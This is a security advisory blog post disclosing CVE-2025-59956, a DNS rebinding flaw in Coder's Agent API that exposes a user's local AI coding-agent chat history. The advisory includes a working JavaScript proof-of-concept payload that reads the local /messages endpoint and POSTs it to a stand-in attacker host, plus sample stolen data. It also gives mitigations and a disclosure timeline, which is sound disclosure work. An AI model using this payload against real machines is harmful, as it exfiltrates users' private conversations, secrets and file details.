---
layout: post
title: "Coder's Agent API Exposes User Chat History Via DNS Rebinding Attack"
date: 2025-09-19
categories: [dns-rebinding, security, api, llm]
excerpt: "A DNS rebinding vulnerability in Coder's Agent API allows remote attackers to exfiltrate a user's entire local message history, which may contain sensitive data like secret keys and intellectual property."
---

**Author:** Evan Harris  
**Affected Component:** Coder's Agent API  
**CVE**: CVE-2025-59956  
**CVSS 3.1 Score**: 6.5 (Medium) - CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N  

# Overview 
Coder's Agent API is an open source HTTP API for Claude Code, Goose, Aider, Gemini, Amp, and Codex. 

MCPSec found a DNS rebinding vulnerability in the Agent API that allows remote attackers to exfiltrate a user's Claude Code message history. 

Coder fixed this issue in release v0.4.0. Agent API users should update to this version, or later. 

# Impact 
Attackers gain full GET access to the /messages endpoint served by the Agent API. 

This allows for the unauthorized exfiltration of sensitive user data, specifically local message history which can include secret keys, file system contents and intellectual property the user is working on locally. 

DNS rebinding can happen within a few seconds once connected to a malicious web server. 

## Proof of Concept 

Take the following assumptions: 
- The victim machine is running the Agent API. 
- The victim navigates to a malicious website. 
- The website executes a DNS rebinding attack to manipulate the victim's web browser to interact with the vulnerable Agent API on the attacker's behalf. 

After the DNS rebinding has been completed, an attacker can consume the locally served /messages endpoint. A victim's entire chat history with the Agent API can be exfiltrated to an attacker's server. 

MCPSec performed a proof of concept attack via the following: 
1. Deploy a DNS rebinding application (e.g. Singularity of Origin). 

2. Construct a payload served by a malicious website to obtain and exfiltrate data.

This JavaScript code, served from the malicious site, fetches the message history and sends it to the attacker.
```javascript
const AgentAPI = () => {
  function attack(headers, cookie, body) {
    fetch('http://localhost:3284/messages', {
      method: 'GET',
      mode: "cors",
    }).then(response => {
      const ATTACKER_SERVER = 'https://attacker.com/steal'
      response.json().then(victimMessageHistory => {
        fetch(ATTACKER_SERVER, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(victimMessageHistory)
        }).then(r => {
          console.log("attacker server response", r)
        }).catch(e => {
          console.error('failed to post', e)
        })
      }).catch(e => {
        console.error('failed to parse response ', e)
      })
    }).catch(e => {
      console.error("failed to get messages", e)
    })
  }

  // Invoked to determine whether the rebinded service
  // is the one targeted by this payload. Must return true or false.
  async function isService(headers, cookie, body) {
    let controller = new AbortController();
    let signal = controller.signal;
    return timeout(1000, fetch(`http://localhost:3284/docs`, {
        mode: 'no-cors',
        credentials: 'omit',
        signal
      }), controller)
      .then(response => {
        return true;
      })
      .catch(e => {
        return (false);
      })
  }

  return {
    attack,
    isService
  }
}

Registry["AgentAPI"] = AgentAPI();
````

The /messages endpoint is being served on the victim's local machine, and responds with their chat history when queried. 

3. The attacker must run a data collection server that will receive a POST request. The contents of the POST request should be the response from the victim's Agent API /messages endpoint. 

On the victim machine, the Agent API was prompted to checkout the local file system. This is what was sent to the attacker's data collection server: 

The following is an example of the JSON data stolen from a victim who had asked the agent about their local filesystem.

```json
{
  "$schema": "http://localhost:3284/schemas/MessagesResponseBody.json",
  "messages": [{
    "id": 0,
    "content": "╭───────────────────────────────────────────────────╮ \n│ ✻ Welcome to Claude Code! │ \n│ │ \n│ /help for help, /status for your current setup │ \n│ │ \n│ cwd: /home/evan/Downloads │ \n╰───────────────────────────────────────────────────╯ \n \n ※ Tip: Press Esc twice to edit your previous messages ",
    "role": "agent",
    "time": "2025-07-25T11:20:04.988043205+02:00"
  }, {
    "id": 1,
    "content": "Hello, agent!",
    "role": "user",
    "time": "2025-07-25T13:11:16.699082236+02:00"
  }, {
    "id": 3,
    "content": "tell me about my filessytem",
    "role": "user",
    "time": "2025-07-25T13:14:51.120102556+02:00"
  }, {
    "id": 4,
    "content": "● I'll explore your filesystem to show you what's in your current directory \n and its structure. \n \n● List(.) \n ⎿ Listed 1048 paths (ctrl+r to expand) \n \n● Your Downloads directory contains a wide variety of files: \n \n Documents & PDFs [REDACTED_FOR_MY_OWN_SECURITY] The directory appears to be a typical developer's Downloads folder with a \n mix of tools, documents, and research materials, particularly focused on \n AI/ML security research.",
    "role": "agent",
    "time": "2025-07-25T13:15:10.681040365+02:00"
  }]
}
```
## Recommended Mitigations

### For Users (Immediate)

  - **Update to Agent API version v0.4.0 or later immediately.** This version contains the fix for the vulnerability.

### For Developers (Long-term)

  - **Implement robust Host header validation** for all locally served HTTP APIs to prevent DNS rebinding.
  - **Implement CSRF protection** to prevent other forms of cross-origin attacks.
  - **Add security warnings** in documentation for tools that expose local network services.

This vulnerability was reported to the Coder team through responsible disclosure practices. Coder responded quickly to patch the issue.

## Disclosure Timeline

  - **2025-07-25**: Initial vulnerability report submitted to Coder.
  - **2025-07-25**: Coder acknowledges receipt of report.
  - **2025-07-29**: Coder indicates they were able to reproduce and validate the attack scenario.
  - **2025-08-13**: Vulnerability was patched.
  - **2025-08-21**: Coder decided to award a security bounty for the report.
  - **2025-09-09**: Mutually agreeable advisory publication date agreed upon.
  - **2025-09-19**: Security advisory released.

## Conclusion

The DNS rebinding vulnerability in Coder's Agent API demonstrates a critical security challenge for the growing ecosystem of local AI-powered developer tools. While these tools offer powerful capabilities, they must be built with a security-first mindset to protect against web-based threats.

Shout out to the Coder team for their prompt and professional response in patching this vulnerability. All users of the Agent API should update to the latest version to ensure they are protected.

## References

  - [Patched Release (v0.4.0)](https://github.com/coder/agentapi/releases/tag/v0.4.0){:target="\_blank"}
  - [CVE-2025-59956 Details](https://nvd.nist.gov/vuln/detail/CVE-2025-59956){:target="_blank"}
